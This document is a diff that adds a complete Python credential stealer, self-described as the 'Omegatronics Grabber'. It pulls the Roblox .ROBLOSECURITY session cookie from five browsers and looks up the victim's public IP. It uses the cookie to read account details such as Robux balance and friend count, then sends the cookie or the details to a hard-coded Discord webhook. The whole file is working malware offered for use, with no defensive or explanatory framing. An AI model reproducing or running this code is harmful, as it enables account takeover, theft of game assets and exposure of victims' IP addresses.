@@ -1,0 +1,126 @@
+import requests
+import json
+from base64 import *
+from discordwebhook import *
+import robloxpy
+import browser_cookie3
+import os
+
+ip = requests.get("https://api.ipify.org").text
+
+webhook = "https://discord.com/api/webhooks/1103416989948584027/0vn8brnjzA-NirrRx8uAyFdiWt_lDQur9FyBwJJU4hTVVIX3Zec0WucCn06sAmZeD88W"
+def command(c):
+    os.system(c)
+def cls():
+    os.system("cls")
+
+def cookieLogger():
+
+    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
+
+    try:
+        cookies = browser_cookie3.firefox(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+    try:
+        cookies = browser_cookie3.chromium(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.edge(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.opera(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.chrome(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+
+cookies = cookieLogger()
+
+roblox_cookie = cookies[1]
+
+isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
+if isvalid == "Valid Cookie":
+    pass
+else:
+    requests.post(url=webhook,data={"content":f":cloud_tornado: Whops! \n:cloud_tornado: This is a old cookie that can not be used :cloud_tornado: : ```{roblox_cookie}```"})
+    exit()
+
+ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
+info = json.loads(ebruh.text)
+rid = info["UserID"]
+rap = robloxpy.User.External.GetRAP(rid)
+friends = robloxpy.User.Friends.External.GetCount(rid)
+age = robloxpy.User.External.GetAge(rid)
+crdate = robloxpy.User.External.CreationDate(rid)
+rolimons = f"https://www.rolimons.com/player/{rid}"
+roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
+headshot = robloxpy.User.External.GetHeadshot(rid)
+username = info['UserName']
+robux = info['RobuxBalance']
+premium = info['IsPremium'];  
+
+
+discord = Discord(url=webhook)
+discord.post(
+    username="⭐Omegatronics⭐",
+    avatar_url="https://cdn.discordapp.com/attachments/1103390339412283524/1104902065559445655/star.jpg",
+    embeds=[
+        {
+            "username": "⭐Omegatronics⭐",
+            "title": "⭐ Omegatronics Grabber",
+            "description" : f"Creator Omegatronic#7160",
+            "color" : 000000,
+            "fields": [ 
+                {"name" : ":zap: Tada i found a ip adress ", "value" : ip, "inline:": True}, 
+                {"name": ":zap: Username", "value": username, "inline": True},
+                {"name": ":zap: This is how mutch robux the target haves", "value": robux, "inline": True},
+                {"name": ":zap: Premium?", "value": premium,"inline": True},
+                {"name": ":zap: Join date", "value": crdate, "inline": True},
+                {"name" : ":zap: Limmited rap", "value": rap,"inline": True},
+                {"name" : ":zap: Friends?", "value": friends, "inline": True},
+                {"name" : ":zap: Age", "value": age, "inline": True},
+                       
+                      
+                       
+                         
+                
+            ],
+           "thumbnail": {"url": headshot}, 
+
+
+        }
+    ],
+)
